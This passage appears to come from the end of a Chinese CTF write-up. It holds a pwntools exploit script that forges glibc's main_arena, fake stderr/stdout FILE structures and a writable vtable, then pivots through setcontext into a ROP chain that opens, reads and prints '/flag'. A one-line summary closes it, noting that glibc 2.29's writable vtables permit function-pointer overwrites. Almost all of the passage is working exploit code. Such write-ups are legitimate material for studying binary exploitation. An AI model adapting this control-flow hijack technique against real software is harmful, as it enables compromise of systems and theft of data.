        #huge payload
        payload = '\x0a'+'\x00'*4
        layout = [
                libc_base + (0x7ffff7f6e590-static_libc),
                0xffffffffffffffff,
                0x0,
                0x7ffff7f6bae0,
                0x0,
                0x0,
                0x0,
                0xffffffff,
                libc_base + (0x7ffff7f6bac8-static_libc),
                0x0,
                0x7ffff7f6d560
                ]
        layout = flat(layout)
        payload += layout
        #start with 0x7ffff7f6bae0
        fake_top_chunk = libc_base + (0x7ffff7f6bae0-static_libc)
        part2 = p64(0)+p64(0x10000-(fake_top_chunk&0xf000)+1)
        arg_list = [libc_base+(0x7ffff7f6ca10-static_libc),libc_base+(0x7ffff7f6ca50-static_libc)]
        leave_ret = libc_base + 0x0000000000058373
        p_rdx_rsi = libc_base + 0x000000000012bdc9
        p_rdi = libc_base + 0x0000000000026542
        p_rsi = libc_base + 0x0000000000026f9e
        p_rdx = libc_base + 0x000000000012bda6
        p_rax = libc_base + 0x0000000000047cf8
        syscall = libc_base + 0x00000000000cf6c5
        rops = p64(p_rax)+p64(2)
        rops += p64(syscall)
        #rops += p64(libc.sym['open'])
        #read
        rops += p64(p_rdi)+p64(3)
        rops += p64(p_rdx_rsi)+p64(0x20)+p64(arg_list[1])
        rops += p64(p_rax)+p64(0)
        rops += p64(syscall)
        #rops += p64(libc.sym['read'])
        #write
        rops += p64(p_rdi)+p64(2)
        rops += p64(p_rsi)+p64(arg_list[1])
        rops += p64(p_rax)+p64(1)
        rops += p64(syscall)
        print len(rops)
        part2 += rops+'\x00'*(0xba0-0xae0+8-0x10-len(rops))
        part2 += p64(libc_base+(0x7ffff7f6bba8-static_libc))+'\x00'*(0xc08-0xbb0+8)+p64(0)*2+p64(libc_base+(0x7ffff7e20190-static_libc))+p64(0)*3
        payload += part2
        #start with main_arena
        main_arena = p64(0)+p64(0)#have_fastchunks = 0
        main_arena += p64(0)*10
        #fake top chunk
        main_arena += p64(fake_top_chunk)+p64(0)*3
        payload += main_arena
        #satrt:0x7ffff7f6bcc0 end:0x7ffff7f6c498
        main_arena1 = ''
        for i in range(0,(0x7ffff7f6c498-0x7ffff7f6bcc0+8)/8,2):
            main_arena1 += p64(libc_base + (0x7ffff7f6bcc0-static_libc) - 0x10 + (i/2)*0x10)*2
        payload += main_arena1
        #begin with 0x7ffff7f6c4a0
        part3 = flat([
            0x4,
            0x0,
            libc_base+(0x7ffff7f6bc40-static_libc),
            0,
            1,
            0x21000,
            0x21000,
            libc_base+(0x7ffff7e21a90-static_libc),
            libc_base+(0x7ffff7e230b0-static_libc),
            0x0,
            libc_base+(0x7ffff7f37f3d-static_libc),
            libc_base+(0x7ffff7f37f3d-static_libc),
            libc_base+(0x7fffffffe878-static_libc),
            libc_base+(0x7fffffffe876-static_libc),
            0,
            0,
            0,
            1,
            2,
            libc_base+(0x7ffff7f6f2d8-static_libc),
            0,
            0xffffffffffffffff,
            libc_base+(0x7ffff7f6a6e0-static_libc),
            libc_base+(0x7ffff7f3de48-static_libc),
            libc_base+(0x7ffff7f68580-static_libc),
            libc_base+(0x7ffff7f6c568-static_libc),
            libc_base+(0x7ffff7f68b40-static_libc),
            libc_base+(0x7ffff7f693c0-static_libc),
            libc_base+(0x7ffff7f68900-static_libc),
            libc_base+(0x7ffff7f68880-static_libc),
            0,
            libc_base+(0x7ffff7f69080-static_libc),
            libc_base+(0x7ffff7f690e0-static_libc),
            libc_base+(0x7ffff7f69160-static_libc),
            libc_base+(0x7ffff7f69220-static_libc),
            libc_base+(0x7ffff7f692a0-static_libc),
            libc_base+(0x7ffff7f69300-static_libc),
            libc_base+(0x7ffff7f213e0-static_libc),
            libc_base+(0x7ffff7f204e0-static_libc),
            libc_base+(0x7ffff7f20ae0-static_libc),
            ])
        part3 += p64(libc_base+(0x7ffff7f38678-libc_base))*13+p64(0)*3+p64(libc_base+(0x7ffff7f6c680-static_libc))+p64(0)*3
        payload += part3
        #fake stderr
        fake_stderr = p64(0xfbad2087)+p64(libc_base+(0x7ffff7f6c703-static_libc))*7+p64(libc_base+(0x7ffff7f6c704-static_libc))+p64(0)*4+p64(libc_base+(0x7ffff7f6c760-static_libc))+p64(2)+p64(0xffffffffffffffff)+p64(0)+p64(libc_base+(0x7ffff7f6e570-static_libc))+p64(0xffffffffffffffff)+p64(0)+p64(libc_base+(0x7ffff7f6b780-static_libc))+p64(0)*4+p64(libc_base+(0x7ffff7f6c748-static_libc))+p64(0)+p64(libc_base+(0x7ffff7f6d560-static_libc))
        payload += fake_stderr
        #fake stdout
        fake_stdout = p64(0)+p64(libc_base+(0x7ffff7f6c7e3-static_libc))*7+p64(libc_base+(0x7ffff7f6c7e4-static_libc))+p64(0)*4+p64(libc_base+(0x7ffff7f6ba00-static_libc))+p64(1)+p64(0xffffffffffffffff)+p64(0)+p64(libc_base+(0x7ffff7f6e580-static_libc))+p64(0xffffffffffffffff)+p64(0)+p64(libc_base+(0x7ffff7f6b8c0-static_libc))+p64(0)*3+p64(0xffffffff)+p64(libc_base+(0x7ffff7f6c828-static_libc))+p64(0)+p64(IO_helper_jumps)
        payload += fake_stdout
        part4 = p64(libc_base+(0x7ffff7f6c680-static_libc))+p64(libc_base+(0x7ffff7f6c760-static_libc))+p64(libc_base+(0x7ffff7f6ba00-static_libc))
        part4 += flat([
            libc_base+(0x7ffff7dade90-static_libc),
            libc_base+(0x7ffff7f1bdd0-static_libc),
            libc_base+(0x7ffff7f1d000-static_libc),
            libc_base+(0x7ffff7f1d030-static_libc),
            libc_base+(0x7ffff7f1d090-static_libc),
            libc_base+(0x7ffff7f1d2e0-static_libc),
            libc_base+(0x7ffff7f1d4e0-static_libc),
            libc_base+(0x7ffff7f1d5b0-static_libc),
            libc_base+(0x7ffff7f1d5f0-static_libc),
            libc_base+(0x7ffff7f1d650-static_libc),
            libc_base+(0x7ffff7e2e390-static_libc),
            libc_base+(0x7ffff7f1d770-static_libc),
            libc_base+(0x7ffff7f1d7b0-static_libc),
            libc_base+(0x7ffff7f1d810-static_libc),
            libc_base+(0x7ffff7f1d880-static_libc),
            libc_base+(0x7ffff7e9f2a0-static_libc),
            libc_base+(0x7ffff7f1d890-static_libc),
            libc_base+(0x7ffff7f1d940-static_libc),
            libc_base+(0x7ffff7f1d980-static_libc),
            libc_base+(0x7ffff7ec7150-static_libc),
            libc_base+(0x7ffff7f1da40-static_libc),
            libc_base+(0x7ffff7f6c900-static_libc),
            libc_base+(0x7ffff7f1dbb0-static_libc),
            libc_base+(0x7ffff7f1dc30-static_libc),
            libc_base+(0x7ffff7ed8890-static_libc),
            libc_base+(0x7ffff7f1dc50-static_libc),
            libc_base+(0x7ffff7f1dc80-static_libc),
            libc_base+(0x7ffff7f1dcb0-static_libc),
            libc_base+(0x7ffff7f1dce0-static_libc),
            libc_base+(0x7ffff7f1dd10-static_libc),
            libc_base+(0x7ffff7f1ddd0-static_libc),
            ])
        part4 += p64(0)*2
        payload += part4
        rop_addr = libc_base + (0x7ffff7f6baf0-static_libc)
        fake_vatable = p64(0)*2 + flat([
            libc_base+(0x7ffff7e18a70-static_libc),
            libc_base+(0x7ffff7dfb530-static_libc),
            libc_base+(0x7ffff7e18140-static_libc),
            libc_base+(0x7ffff7e18150-static_libc),
            libc_base+(0x7ffff7e197b0-static_libc),
            libc_base+(0x7ffff7e181b0-static_libc),
            libc_base+(0x7ffff7e183b0-static_libc),
            libc_base+(0x7ffff7e18ae0-static_libc),
            libc_base+(0x7ffff7e18800-static_libc),
            libc_base+(0x7ffff7e186d0-static_libc),
            libc_base+(0x7ffff7e18a60-static_libc),
            arg_list[0],
            0,
            rop_addr-8,
            libc_base+(0x7ffff7e198f0-static_libc),
            0,
            libc_base+(0x7ffff7e19900-static_libc),
            ])
        part5 = p64(0)+p64(rop_addr)+p64(leave_ret)+'/flag'.ljust(0x20,'\x00')+p64(libc.sym['setcontext']+53)
        payload += fake_vatable + part5
        p.recvuntil("2 : ")
        p.send(payload)
        p.interactive()
    exp()
## 总结
从这道题目上可以看到`glibc 2.29`虽然没有去掉`vtable
check`，但是`vtable`可写导致可以覆写上面的函数指针，这或许会成为一些题目的新的出题思路。